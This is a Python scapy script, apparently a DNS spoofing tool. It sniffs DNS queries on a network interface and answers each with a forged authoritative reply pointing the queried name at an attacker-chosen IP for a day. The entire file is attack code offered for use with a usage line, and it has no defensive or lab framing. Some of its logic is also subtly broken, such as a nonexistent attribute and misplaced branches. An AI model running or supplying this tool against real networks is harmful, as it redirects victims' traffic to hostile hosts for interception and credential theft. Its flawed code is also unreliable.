#!/usr/bin/env python

from os import uname
from subprocess import call
from sys import argv, exit
from time import ctime, sleep
from scapy.all import *


def osCheck():

  if (uname()[0].strip()=='Linux') or (uname()[0].strip() == 'linux'):
    print(' Current system is Linux...Good to go!!!')
  else:
    print(' Not a Linux system ... exiting ')
    exit(0)

def usage():

  print(' Usage: sudo /.dnsspoof2.py <interface> <IP of DNS Server> ')


def main():

  call('clear')
  osCheck()

  if len(argv) != 3:
    usage()
    exit(0)

  while 1:

    print(' Sniffing for DNS Packet ')
    getDNSPacket = sniff(iface=argv[1],filter="dst port 53", count=1)

    if (getDNSPacket[0].haslayer(DNS)) and (getDNSPacket[0].getlayer(DNS).qr == 0) and (getDNSPacket[0].getlayer(DNS).qd.qtype == 1) and (getDNSPacket[0].getlayer(DNS).qd.qclass == 1):
      print('\n Got Query on %s' %ctime())

      clientSrcIP = getDNSPacket[0].getlayer(IP).src

    if getDNSPacket[0].haslayer(UDP):

      clientSrcPort = getDNSPacket[0].getlayer(UDP).sport

    elif getDNSPacket[0].haslayer(TCP):

      clientSrcPort = getDNSPacket[0].getlayer(TCP).sport

    else:

      pass

    dns_layer = getDNSPacket[0].getlayer(DNS)

    clientDNSQueryID = dns_layer.id
    clientDNSQueryDataCount = dns_layer.qdcount
    clientDNSServer = dns_layer.dst
    clientDNSQuery = dns_layer.qd.qname

    print(' Receivec Src IP: %s, \n Received Src Port: %d \n Received Query ID: %d \n Query Data Count: %d \n Current DNS Server: %s \n DNS Query: %s' %(clientSrcIP,clientSrcPort, clientDNSQueryID,clientDNSQueryDataCount,clientDNSServer,clientDNSQuery))

    spoofedDNSServerIP = argv[2].strip()

    spoofedIPPkt = IP(src = spoofedDNSServerIP, dst = clientSrcIP)

    if getDNSPacket[0].haslayer(UDP):
      spoofedUDP_TCPPkt = UDP(sport = 53, dport = clientSrcPort)
    elif getDNSPacket[0].haslayer(TCP):
      spoofedUDP_TCPPkt = TCP(sport = 53, dport = clientSrcPort)

    spoofedDNSPacket = DNS(id=clientDNSQueryID,
                           qr=1,
                           opcode=dns_layer.opcode,
                           aa=1,
                           rd=0,
                           ra=0,
                           z=0,
                           rcode=0,
                           qdcount=clientDNSQueryDataCount,
                           ancount=1,
                           nscount=1,
                           arcount=1,
                           qd=DNSQR(qname=clientDNSQuery,qtype=dns_layer.qd.qtype,qclass=dns_layer.qd.qclass),
                           an=DNSRR(rrname=clientDNSQuery,rdata=argv[2].strip(),ttl=86400),
                           ns=DNSRR(rrname=clientDNSQuery,type=2,ttl=86400,rdata=argv[2]),
                           ar=DNSRR(rrname=clientDNSQuery,rdata=argv[2].strip()))


    print(' \n Sending spoofed response packet ')
    sendp(Ether()/spoofedIPPkt/spoofedUDP_TCPPkt/spoofedDNSPacket,iface=argv[1].strip(),count=1)
    print(' Spoofed DNS Server: %s \n src port:%d dest port:%d ' %(spoofedDNSServerIP,53,clientSrcPort))

  else:
    pass

if __name__ == '__main__':
  main()
